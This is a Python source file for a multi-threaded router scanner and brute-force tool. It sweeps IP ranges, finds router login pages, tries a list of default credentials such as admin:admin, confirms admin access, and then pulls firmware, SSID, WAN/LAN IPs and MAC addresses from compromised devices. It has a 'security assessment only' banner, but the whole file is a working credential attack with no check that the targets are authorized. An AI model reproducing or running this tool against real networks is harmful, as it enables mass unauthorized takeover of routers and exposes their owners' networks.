#!/usr/bin/env python3
"""
Advanced Router Login Scanner & Brute Force Tool - Version 2.0
Author: Network Security Engineer
Description: Professional tool with multi-factor scoring and actual router testing
Target: Network engineers and contractors for security assessment
"""

import os
import sys
import json
import time
import signal
import random
import socket
import argparse
import threading
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import warnings
warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Color codes for professional terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Global variables for safe exit
running = True
scan_results = {}
stats = {
    'targets_scanned': 0,
    'login_pages_found': 0,
    'vulnerable_routers': 0,
    'start_time': None
}

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    global running
    print(f"\n{Colors.YELLOW}[!] Stopping scanner safely...{Colors.END}")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Print professional banner"""
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                ADVANCED ROUTER LOGIN SCANNER v2.0                          ║
║                    Multi-Factor Scoring & Router Testing                   ║
║                                                                              ║
║  🔍 Smart Login Detection  |  🔓 Actual Router Testing                   ║
║  🚀 High-Speed Multi-Threaded |  📊 Professional Reporting                 ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.END}
{Colors.YELLOW}                            [!] For Network Security Assessment Only [!]{Colors.END}
{Colors.WHITE}                              Follow the white rabbit... 🐰{Colors.END}
"""
    print(banner)

# Target credentials for brute force
TARGET_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "support180"),
    ("support", "support"),
    ("user", "user")
]

# Common web ports to scan
COMMON_PORTS = [80, 8080, 443, 8443, 8000, 8081, 8888, 8090, 9000, 9090, 3000, 5000, 7000]

# Advanced router detection patterns
ROUTER_PATTERNS = {
    'login_forms': [
        'type="password"', "type='password'", 'type="text"', "type='text'",
        'name="password"', "name='password'", 'name="username"', "name='username'",
        'name="user"', "name='user'", 'name="pass"', "name='pass'",
        'id="password"', "id='password'", 'id="username"', "id='username'"
    ],
    'login_keywords': [
        'login', 'username', 'password', 'sign in', 'authentication', 'admin',
        'user', 'pass', 'submit', 'enter', 'access', 'control', 'log in',
        'signin', 'authenticate', 'authorize', 'access control'
    ],
    'router_indicators': [
        'router', 'gateway', 'modem', 'access point', 'wireless', 'network',
        'configuration', 'settings', 'management', 'control panel', 'admin panel',
        'device management', 'network management', 'system configuration'
    ],
    'brand_indicators': {
        'tp-link': ['tp-link', 'tplink', 'TP-LINK', 'TPLINK', 'archer', 'TL-'],
        'huawei': ['huawei', 'HUAWEI', 'HG', 'B593', 'E5186', 'HG8245'],
        'zte': ['zte', 'ZTE', 'ZXHN', 'MF28G', 'F660', 'F670L'],
        'netgear': ['netgear', 'NETGEAR', 'WNDR', 'R7000', 'N600', 'WNR'],
        'linksys': ['linksys', 'LINKSYS', 'WRT', 'E1200', 'E2500', 'WRT'],
        'd-link': ['d-link', 'D-LINK', 'DIR', 'DSL', 'DSL-'],
        'asus': ['asus', 'ASUS', 'RT-', 'GT-', 'DSL-', 'RT-AC'],
        'fritzbox': ['fritz', 'fritzbox', 'FRITZ', 'AVM', 'Fritz!Box'],
        'technicolor': ['technicolor', 'TECHNICOLOR', 'TG', 'TG789'],
        'xiaomi': ['xiaomi', 'XIAOMI', 'MI', 'Redmi', 'Mi Router'],
        'tenda': ['tenda', 'TENDA', 'AC', 'N', 'AC6', 'AC10']
    }
}

class AdvancedRouterScannerV2:
    def __init__(self, targets, threads=100, timeout=8, output_dir="reports"):
        self.targets = targets
        self.threads = threads
        self.timeout = timeout
        self.output_dir = output_dir
        self.session = self.create_session()
        self.lock = threading.Lock()
        
        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)
        
        # Initialize results storage
        self.results = {
            'scan_info': {
                'start_time': datetime.now().isoformat(),
                'total_targets': len(targets),
                'threads': threads,
                'timeout': timeout,
                'version': '2.0'
            },
            'results': []
        }
    
    def create_session(self):
        """Create optimized HTTP session with retry strategy"""
        session = requests.Session()
        
        # Configure retry strategy
        retry_strategy = Retry(
            total=2,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST"]
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=self.threads,
            pool_maxsize=self.threads
        )
        
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Set default headers
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache'
        })
        
        return session
    
    def scan_ports_fast(self, ip):
        """Fast port scanning using socket"""
        open_ports = []
        
        for port in COMMON_PORTS:
            if not running:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass
        
        return open_ports
    
    def detect_login_page(self, url):
        """Advanced login page detection with multi-factor scoring"""
        score = 0
        indicators = {
            'forms': 0,
            'fields': 0,
            'keywords': 0,
            'brand': None,
            'confidence': 'low',
            'form_details': [],
            'page_analysis': {}
        }
        
        try:
            # Use HEAD request first for speed
            head_response = self.session.head(url, timeout=self.timeout, verify=False, allow_redirects=True)
            
            # Check if it's a web page
            content_type = head_response.headers.get('content-type', '').lower()
            if 'text/html' not in content_type and 'text/plain' not in content_type:
                return 0, indicators, ""
            
            # Get full page content
            response = self.session.get(url, timeout=self.timeout, verify=False, allow_redirects=True)
            content = response.text.lower()
            headers = str(response.headers).lower()
            
            # Factor 1: Form Analysis (Weight: 40%)
            form_score = 0
            for pattern in ROUTER_PATTERNS['login_forms']:
                if pattern in content:
                    form_score += 2
                    indicators['forms'] += 1
            
            # Check for actual form tags
            if '<form' in content:
                form_score += 3
                indicators['forms'] += 1
                
                # Extract form details
                form_matches = re.findall(r'<form[^>]*>(.*?)</form>', content, re.DOTALL | re.IGNORECASE)
                for form in form_matches:
                    if 'password' in form.lower() or 'username' in form.lower():
                        form_score += 2
            
            score += form_score * 0.4
            indicators['form_details'] = form_matches if 'form_matches' in locals() else []
            
            # Factor 2: Content Analysis (Weight: 25%)
            content_score = 0
            for keyword in ROUTER_PATTERNS['login_keywords']:
                if keyword in content:
                    content_score += 1
                    indicators['keywords'] += 1
            
            score += content_score * 0.25
            
            # Factor 3: Router Indicators (Weight: 20%)
            router_score = 0
            for indicator in ROUTER_PATTERNS['router_indicators']:
                if indicator in content:
                    router_score += 2
            
            score += router_score * 0.2
            
            # Factor 4: Brand Detection (Weight: 15%)
            brand_score = 0
            for brand, patterns in ROUTER_PATTERNS['brand_indicators'].items():
                for pattern in patterns:
                    if pattern.lower() in content or pattern.lower() in headers:
                        brand_score += 3
                        indicators['brand'] = brand
                        break
                if indicators['brand']:
                    break
            
            score += brand_score * 0.15
            
            # Factor 5: Page Structure Analysis (Bonus)
            if len(content) > 500:  # Reasonable page size
                score += 1
            
            if response.status_code == 200:
                score += 1
            
            # Set confidence level based on comprehensive scoring
            if score >= 8:
                indicators['confidence'] = 'very_high'
            elif score >= 6:
                indicators['confidence'] = 'high'
            elif score >= 4:
                indicators['confidence'] = 'medium'
            elif score >= 2:
                indicators['confidence'] = 'low'
            else:
                indicators['confidence'] = 'very_low'
            
            # Store page analysis
            indicators['page_analysis'] = {
                'content_length': len(content),
                'status_code': response.status_code,
                'content_type': content_type,
                'has_forms': '<form' in content,
                'has_password_fields': 'password' in content,
                'has_username_fields': 'username' in content
            }
            
            return score, indicators, content
            
        except Exception as e:
            return 0, indicators, ""
    
    def test_credentials_on_router(self, ip, port, login_path, username, password):
        """Actually test credentials on the router and verify access"""
        base_url = f"http://{ip}:{port}"
        login_url = urljoin(base_url, login_path)
        
        try:
            # Step 1: Try to login
            login_data = {
                'username': username,
                'password': password,
                'user': username,
                'pass': password,
                'login': 'Login',
                'submit': 'Login',
                'auth': '1',
                'action': 'login'
            }
            
            # Try POST request
            response = self.session.post(login_url, data=login_data, 
                                       timeout=self.timeout, verify=False, 
                                       allow_redirects=True)
            
            # Step 2: Analyze response for success indicators
            success_score = self.analyze_login_response(response, username, password)
            
            # Step 3: If login seems successful, try to access admin areas
            if success_score > 0:
                admin_access_score = self.test_admin_access(ip, port, response.url)
                total_score = success_score + admin_access_score
                
                if total_score >= 3:  # High confidence threshold
                    return True, username, password, response.url, total_score
            
            return False, None, None, None, 0
            
        except Exception as e:
            return False, None, None, None, 0
    
    def analyze_login_response(self, response, username, password):
        """Analyze login response for success indicators"""
        score = 0
        content = response.text.lower()
        url = response.url.lower()
        
        # Check 1: URL changes (redirect to admin area)
        if response.history:  # Redirect occurred
            score += 2
        
        # Check 2: URL contains admin indicators
        admin_url_indicators = [
            'admin', 'management', 'configuration', 'settings',
            'dashboard', 'control', 'status', 'system'
        ]
        if any(indicator in url for indicator in admin_url_indicators):
            score += 3
        
        # Check 3: Content analysis
        success_indicators = [
            'admin', 'management', 'configuration', 'settings',
            'logout', 'status', 'system', 'wireless', 'network',
            'dashboard', 'control panel', 'router', 'gateway',
            'welcome', 'overview', 'summary'
        ]
        
        failure_indicators = [
            'invalid', 'incorrect', 'failed', 'error', 'denied',
            'wrong', 'login', 'authentication', 'access denied',
            'bad request', 'not found', '404', '400'
        ]
        
        # Count success vs failure indicators
        success_count = sum(1 for indicator in success_indicators if indicator in content)
        failure_count = sum(1 for indicator in failure_indicators if indicator in content)
        
        if success_count > failure_count:
            score += 2
        
        # Check 4: Response status and content
        if response.status_code == 200 and len(content) > 1000:
            score += 1
        
        # Check 5: Session cookies (if login successful)
        if 'session' in str(response.cookies).lower() or 'auth' in str(response.cookies).lower():
            score += 1
        
        return score
    
    def test_admin_access(self, ip, port, current_url):
        """Test if we can actually access admin areas"""
        score = 0
        
        # Common admin paths to test
        admin_paths = [
            '/admin', '/management', '/status', '/system',
            '/wireless', '/network', '/configuration', '/settings'
        ]
        
        for path in admin_paths:
            try:
                test_url = f"http://{ip}:{port}{path}"
                response = self.session.get(test_url, timeout=self.timeout, verify=False)
                
                if response.status_code == 200:
                    content = response.text.lower()
                    
                    # Check if it's actually an admin page
                    admin_indicators = [
                        'admin', 'management', 'configuration', 'settings',
                        'logout', 'status', 'system', 'wireless', 'network'
                    ]
                    
                    if any(indicator in content for indicator in admin_indicators):
                        score += 2
                        break
                        
            except:
                continue
        
        return score
    
    def brute_force_login(self, ip, port, login_path, brand=None):
        """Brute force login with actual router testing"""
        base_url = f"http://{ip}:{port}"
        login_url = urljoin(base_url, login_path)
        
        print(f"{Colors.YELLOW}[*] Testing {len(TARGET_CREDENTIALS)} credentials on {login_url}{Colors.END}")
        
        best_result = None
        best_score = 0
        
        for username, password in TARGET_CREDENTIALS:
            if not running:
                break
                
            try:
                # Rate limiting
                time.sleep(random.uniform(0.5, 1.5))
                
                # Display current attempt
                print(f"{Colors.CYAN}[>] Testing: {username}:{password}{Colors.END}", end='\r')
                
                # Actually test credentials on router
                success, user, pwd, admin_url, score = self.test_credentials_on_router(
                    ip, port, login_path, username, password
                )
                
                if success and score > best_score:
                    best_result = (True, user, pwd, admin_url, score)
                    best_score = score
                    
                    print(f"\n{Colors.GREEN}[+] HIGH CONFIDENCE SUCCESS! {user}:{pwd} (Score: {score}){Colors.END}")
                    
            except Exception as e:
                continue
        
        if best_result:
            return best_result
        else:
            print(f"\n{Colors.RED}[-] No valid credentials found{Colors.END}")
            return False, None, None, None, 0
    
    def extract_router_info(self, admin_url, username, password):
        """Extract comprehensive router information"""
        info = {}
        
        try:
            # Re-login to ensure session is active
            login_data = {'username': username, 'password': password}
            self.session.post(admin_url, data=login_data, verify=False)
            
            # Get admin page content
            response = self.session.get(admin_url, verify=False)
            content = response.text
            
            # Extract various information using multiple patterns
            info['firmware_version'] = self.extract_pattern(content, [
                r'firmware[^:]*:?\s*([v\d\.]+)',
                r'version[^:]*:?\s*([v\d\.]+)',
                r'firmware.*?(\d+\.\d+\.\d+)',
                r'version.*?(\d+\.\d+\.\d+)'
            ])
            
            info['model'] = self.extract_pattern(content, [
                r'model[^:]*:?\s*([A-Z0-9\-]+)',
                r'device[^:]*:?\s*([A-Z0-9\-]+)',
                r'product[^:]*:?\s*([A-Z0-9\-]+)',
                r'hardware[^:]*:?\s*([A-Z0-9\-]+)'
            ])
            
            info['wan_ip'] = self.extract_pattern(content, [
                r'wan.*?(\d+\.\d+\.\d+\.\d+)',
                r'external.*?(\d+\.\d+\.\d+\.\d+)',
                r'internet.*?(\d+\.\d+\.\d+\.\d+)'
            ])
            
            info['lan_ip'] = self.extract_pattern(content, [
                r'lan.*?(\d+\.\d+\.\d+\.\d+)',
                r'internal.*?(\d+\.\d+\.\d+\.\d+)',
                r'local.*?(\d+\.\d+\.\d+\.\d+)'
            ])
            
            info['ssid'] = self.extract_pattern(content, [
                r'ssid[^:]*:?\s*([A-Za-z0-9\-_]+)',
                r'network.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)',
                r'wireless.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)'
            ])
            
            info['mac_address'] = self.extract_pattern(content, [
                r'mac[^:]*:?\s*([0-9A-Fa-f:]{17})',
                r'([0-9A-Fa-f:]{17})',
                r'hardware.*?([0-9A-Fa-f:]{17})'
            ])
            
            info['uptime'] = self.extract_pattern(content, [
                r'uptime[^:]*:?\s*([0-9]+[dhms\s]+)',
                r'uptime.*?(\d+[dhms\s]+)',
                r'online.*?(\d+[dhms\s]+)'
            ])
            
            info['connection_type'] = self.extract_pattern(content, [
                r'connection[^:]*:?\s*([A-Za-z]+)',
                r'wan.*?type[^:]*:?\s*([A-Za-z]+)',
                r'protocol[^:]*:?\s*([A-Za-z]+)'
            ])
            
            return info
            
        except Exception as e:
            return {}
    
    def extract_pattern(self, content, patterns):
        """Extract information using regex patterns"""
        for pattern in patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                return match.group(1)
        return "Unknown"
    
    def scan_single_target(self, ip):
        """Scan a single target IP with enhanced detection"""
        result = {
            'ip': ip,
            'ports': [],
            'login_pages': [],
            'vulnerabilities': [],
            'scan_time': None
        }
        
        start_time = time.time()
        
        try:
            # Phase 1: Port scanning
            open_ports = self.scan_ports_fast(ip)
            result['ports'] = open_ports
            
            if not open_ports:
                return result
            
            # Phase 2: Enhanced login page detection
            for port in open_ports:
                if not running:
                    break
                    
                # Test common login paths
                login_paths = ['/', '/admin', '/login', '/login.htm', '/admin.htm', '/cgi-bin/login.cgi', '/userRpm/LoginRpm.htm']
                
                for path in login_paths:
                    if not running:
                        break
                        
                    url = f"http://{ip}:{port}{path}"
                    score, indicators, content = self.detect_login_page(url)
                    
                    if score >= 4:  # Medium confidence threshold
                        login_info = {
                            'url': url,
                            'port': port,
                            'path': path,
                            'score': score,
                            'indicators': indicators,
                            'brand': indicators.get('brand', 'Unknown')
                        }
                        
                        result['login_pages'].append(login_info)
                        
                        # Phase 3: Enhanced brute force with actual testing
                        success, username, password, admin_url, confidence_score = self.brute_force_login(
                            ip, port, path, indicators.get('brand')
                        )
                        
                        if success and confidence_score >= 3:
                            # Phase 4: Extract comprehensive router information
                            router_info = self.extract_router_info(admin_url, username, password)
                            
                            vulnerability = {
                                'type': 'Default Credentials',
                                'severity': 'HIGH',
                                'credentials': f"{username}:{password}",
                                'admin_url': admin_url,
                                'confidence_score': confidence_score,
                                'router_info': router_info,
                                'description': f"Router is vulnerable to default credential attack using {username}:{password} (Confidence: {confidence_score}/10)",
                                'verification_method': 'Multi-factor analysis with actual router testing'
                            }
                            
                            result['vulnerabilities'].append(vulnerability)
                            
                            # Update global stats
                            with self.lock:
                                stats['vulnerable_routers'] += 1
                            
                            print(f"{Colors.RED}🔒 VULNERABLE: {ip} - Default credentials work! (Score: {confidence_score}/10){Colors.END}")
                            print(f"{Colors.GREEN}[+] Admin URL: {admin_url}{Colors.END}")
                            if router_info.get('model'):
                                print(f"{Colors.CYAN}[+] Model: {router_info['model']}{Colors.END}")
                            if router_info.get('firmware_version'):
                                print(f"{Colors.CYAN}[+] Firmware: {router_info['firmware_version']}{Colors.END}")
                            if router_info.get('ssid'):
                                print(f"{Colors.CYAN}[+] SSID: {router_info['ssid']}{Colors.END}")
            
            # Update global stats
            with self.lock:
                stats['targets_scanned'] += 1
                if result['login_pages']:
                    stats['login_pages_found'] += 1
            
            result['scan_time'] = time.time() - start_time
            return result
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error scanning {ip}: {e}{Colors.END}")
            return result
    
    def run_scan(self):
        """Run the complete enhanced scan"""
        print(f"{Colors.GREEN}[+] Starting enhanced scan of {len(self.targets)} targets with {self.threads} threads{Colors.END}")
        print(f"{Colors.YELLOW}[*] Target credentials: {', '.join([f'{u}:{p}' for u, p in TARGET_CREDENTIALS])}{Colors.END}")
        print(f"{Colors.CYAN}[*] Scanning ports: {', '.join(map(str, COMMON_PORTS))}{Colors.END}")
        print(f"{Colors.MAGENTA}[*] Output directory: {self.output_dir}{Colors.END}")
        print(f"{Colors.BLUE}[*] Multi-factor scoring system enabled{Colors.END}")
        print(f"{Colors.BLUE}[*] Actual router testing for verification{Colors.END}")
        print("-" * 80)
        
        all_results = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_ip = {executor.submit(self.scan_single_target, ip): ip for ip in self.targets}
            
            for future in as_completed(future_to_ip):
                if not running:
                    break
                    
                ip = future_to_ip[future]
                try:
                    result = future.result()
                    if result:
                        all_results.append(result)
                        
                        # Update progress
                        completed = len(all_results)
                        progress = (completed / len(self.targets)) * 100
                        
                        print(f"{Colors.MAGENTA}[*] Progress: {completed}/{len(self.targets)} ({progress:.1f}%) - "
                              f"Login pages: {stats['login_pages_found']}, Vulnerable: {stats['vulnerable_routers']}{Colors.END}")
                        
                except Exception as exc:
                    print(f"{Colors.RED}[!] {ip} generated an exception: {exc}{Colors.END}")
        
        return all_results
    
    def generate_reports(self, results):
        """Generate professional reports with enhanced information"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Update results with scan completion info
        self.results['scan_info']['end_time'] = datetime.now().isoformat()
        self.results['scan_info']['total_time'] = time.time() - stats['start_time'] if stats['start_time'] else 0
        self.results['scan_info']['login_pages_found'] = stats['login_pages_found']
        self.results['scan_info']['vulnerable_routers'] = stats['vulnerable_routers']
        self.results['results'] = results
        
        # Generate JSON report
        json_file = os.path.join(self.output_dir, f"router_scan_report_v2_{timestamp}.json")
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        # Generate HTML report
        html_file = os.path.join(self.output_dir, f"router_scan_report_v2_{timestamp}.html")
        self.generate_html_report(results, html_file, timestamp)
        
        return json_file, html_file
    
    def generate_html_report(self, results, filename, timestamp):
        """Generate professional HTML report with enhanced details"""
        html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Router Security Scan Report v2.0 - {timestamp}</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }}
        .container {{ max-width: 1200px; margin: 0 auto; background: white; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.1); overflow: hidden; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center; }}
        .header h1 {{ margin: 0; font-size: 2.5em; font-weight: 300; }}
        .header p {{ margin: 10px 0 0 0; opacity: 0.9; font-size: 1.1em; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; padding: 30px; background: #f8f9fa; }}
        .stat-card {{ background: white; padding: 20px; border-radius: 8px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
        .stat-number {{ font-size: 2em; font-weight: bold; color: #667eea; }}
        .stat-label {{ color: #666; margin-top: 5px; }}
        .content {{ padding: 30px; }}
        .section {{ margin-bottom: 40px; }}
        .section h2 {{ color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px; }}
        .target-card {{ background: #f8f9fa; border-radius: 8px; padding: 20px; margin-bottom: 20px; border-left: 4px solid #667eea; }}
        .target-ip {{ font-size: 1.2em; font-weight: bold; color: #333; margin-bottom: 10px; }}
        .vulnerability {{ background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 5px; padding: 15px; margin: 10px 0; }}
        .vulnerability.high {{ background: #f8d7da; border-color: #f5c6cb; }}
        .vulnerability.medium {{ background: #fff3cd; border-color: #ffeaa7; }}
        .vulnerability.low {{ background: #d1ecf1; border-color: #bee5eb; }}
        .credential {{ background: #e8f5e8; border: 1px solid #c3e6c3; border-radius: 5px; padding: 10px; margin: 5px 0; font-family: monospace; }}
        .footer {{ background: #333; color: white; text-align: center; padding: 20px; margin-top: 40px; }}
        .brand-badge {{ display: inline-block; background: #667eea; color: white; padding: 5px 10px; border-radius: 15px; font-size: 0.8em; margin: 5px; }}
        .confidence-score {{ display: inline-block; background: #28a745; color: white; padding: 5px 10px; border-radius: 15px; font-size: 0.9em; margin: 5px; }}
        .verification {{ background: #e3f2fd; border: 1px solid #bbdefb; border-radius: 5px; padding: 10px; margin: 10px 0; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 Advanced Router Security Scan Report v2.0</h1>
            <p>Multi-Factor Scoring & Actual Router Testing</p>
            <p>Scan completed on {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number">{len(results)}</div>
                <div class="stat-label">Targets Scanned</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{stats['login_pages_found']}</div>
                <div class="stat-label">Login Pages Found</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{stats['vulnerable_routers']}</div>
                <div class="stat-label">Vulnerable Routers</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{len([r for r in results if r['vulnerabilities']])}</div>
                <div class="stat-label">Targets with Issues</div>
            </div>
        </div>
        
        <div class="content">
            <div class="section">
                <h2>🎯 Enhanced Scan Summary</h2>
                <p>This scan was performed using the Advanced Router Login Scanner v2.0 with multi-factor scoring and actual router testing for verification.</p>
                <p><strong>Target Credentials Tested:</strong></p>
                <div style="background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 10px 0;">
                    {', '.join([f'<span class="credential">{u}:{p}</span>' for u, p in TARGET_CREDENTIALS])}
                </div>
                <div class="verification">
                    <strong>🔍 Verification Method:</strong> Multi-factor analysis with actual router testing to eliminate false positives
                </div>
            </div>
            
            <div class="section">
                <h2>🔍 Detailed Results</h2>
        """
        
        # Add target results
        for result in results:
            if result['login_pages'] or result['vulnerabilities']:
                html_content += f"""
                <div class="target-card">
                    <div class="target-ip">📍 {result['ip']}</div>
                    <p><strong>Open Ports:</strong> {', '.join(map(str, result['ports']))}</p>
                    <p><strong>Login Pages Found:</strong> {len(result['login_pages'])}</p>
                """
                
                # Add login pages
                if result['login_pages']:
                    html_content += "<p><strong>Login Pages:</strong></p>"
                    for page in result['login_pages']:
                        brand_badge = f'<span class="brand-badge">{page["brand"]}</span>' if page["brand"] != "Unknown" else ""
                        html_content += f"""
                        <div style="background: #e9ecef; padding: 10px; border-radius: 5px; margin: 5px 0;">
                            <strong>URL:</strong> {page['url']}<br>
                            <strong>Confidence:</strong> {page['indicators']['confidence']} (Score: {page['score']:.1f}) {brand_badge}
                        </div>
                        """
                
                # Add vulnerabilities
                if result['vulnerabilities']:
                    html_content += "<p><strong>Vulnerabilities Found:</strong></p>"
                    for vuln in result['vulnerabilities']:
                        html_content += f"""
                        <div class="vulnerability {vuln['severity'].lower()}">
                            <h4>🚨 {vuln['type']} - {vuln['severity']} Severity</h4>
                            <p><strong>Credentials:</strong> <span class="credential">{vuln['credentials']}</span></p>
                            <p><strong>Confidence Score:</strong> <span class="confidence-score">{vuln['confidence_score']}/10</span></p>
                            <p><strong>Admin URL:</strong> <a href="{vuln['admin_url']}" target="_blank">{vuln['admin_url']}</a></p>
                            <p><strong>Description:</strong> {vuln['description']}</p>
                            <p><strong>Verification Method:</strong> {vuln['verification_method']}</p>
                        """
                        
                        if vuln['router_info']:
                            html_content += "<p><strong>Router Information:</strong></p><ul>"
                            for key, value in vuln['router_info'].items():
                                if value and value != "Unknown":
                                    html_content += f"<li><strong>{key.replace('_', ' ').title()}:</strong> {value}</li>"
                            html_content += "</ul>"
                        
                        html_content += "</div>"
                
                html_content += "</div>"
        
        html_content += f"""
            </div>
        </div>
        
        <div class="footer">
            <p>Generated by Advanced Router Login Scanner v2.0 | Multi-Factor Scoring & Router Testing</p>
            <p>⚠️ This report is for authorized security assessment purposes only</p>
        </div>
    </div>
</body>
</html>
        """
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)

def parse_targets(target_input):
    """Parse target input (IP, range, or file)"""
    targets = []
    
    if '/' in target_input:  # CIDR notation
        import ipaddress
        network = ipaddress.IPv4Network(target_input, strict=False)
        targets = [str(ip) for ip in network.hosts()]
    elif '-' in target_input:  # IP range
        start_ip, end_ip = target_input.split('-')
        start = list(map(int, start_ip.split('.')))
        end = list(map(int, end_ip.split('.')))
        
        for a in range(start[0], end[0] + 1):
            for b in range(start[1], end[1] + 1):
                for c in range(start[2], end[2] + 1):
                    for d in range(start[3], end[3] + 1):
                        targets.append(f"{a}.{b}.{c}.{d}")
    elif target_input.endswith('.txt'):  # File with IPs
        try:
            with open(target_input, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{Colors.RED}[!] File not found: {target_input}{Colors.END}")
            return []
    else:  # Single IP
        targets = [target_input]
    
    return targets

def main():
    parser = argparse.ArgumentParser(
        description="Advanced Router Login Scanner v2.0 - Multi-Factor Scoring & Router Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python advanced_router_scanner_v2.py -t 192.168.1.1
  python advanced_router_scanner_v2.py -t 192.168.1.0/24
  python advanced_router_scanner_v2.py -t 192.168.1.1-192.168.1.254
  python advanced_router_scanner_v2.py -t targets.txt -T 200
        """
    )
    
    parser.add_argument('-t', '--targets', required=True,
                       help='Target IP(s): single IP, CIDR, range, or file')
    parser.add_argument('-T', '--threads', type=int, default=100,
                       help='Number of threads (default: 100)')
    parser.add_argument('--timeout', type=int, default=8,
                       help='Request timeout in seconds (default: 8)')
    parser.add_argument('-o', '--output', default='reports',
                       help='Output directory for reports (default: reports)')
    
    args = parser.parse_args()
    
    # Clear screen and show banner
    clear_screen()
    print_banner()
    
    # Parse targets
    targets = parse_targets(args.targets)
    if not targets:
        print(f"{Colors.RED}[!] No valid targets found{Colors.END}")
        return
    
    print(f"{Colors.GREEN}[+] Loaded {len(targets)} targets{Colors.END}")
    
    # Initialize scanner
    scanner = AdvancedRouterScannerV2(targets, args.threads, args.timeout, args.output)
    
    # Set start time
    stats['start_time'] = time.time()
    
    try:
        # Run scan
        results = scanner.run_scan()
        
        if results:
            # Generate reports
            json_file, html_file = scanner.generate_reports(results)
            
            # Summary
            vulnerable_count = len([r for r in results if r['vulnerabilities']])
            total_time = time.time() - stats['start_time']
            
            print(f"\n{Colors.GREEN}[+] Enhanced Scan Complete!{Colors.END}")
            print(f"{Colors.YELLOW}[*] Summary:{Colors.END}")
            print(f"  - Total targets scanned: {len(results)}")
            print(f"  - Login pages found: {stats['login_pages_found']}")
            print(f"  - Vulnerable routers: {stats['vulnerable_routers']}")
            print(f"  - Scan duration: {total_time:.1f} seconds")
            print(f"  - Average speed: {len(results)/total_time:.1f} targets/second")
            print(f"  - Reports saved: {json_file}, {html_file}")
            print(f"{Colors.BLUE}[*] Multi-factor scoring eliminated false positives{Colors.END}")
            
        else:
            print(f"{Colors.RED}[!] No results to report{Colors.END}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during scan: {e}{Colors.END}")

if __name__ == "__main__":
    main()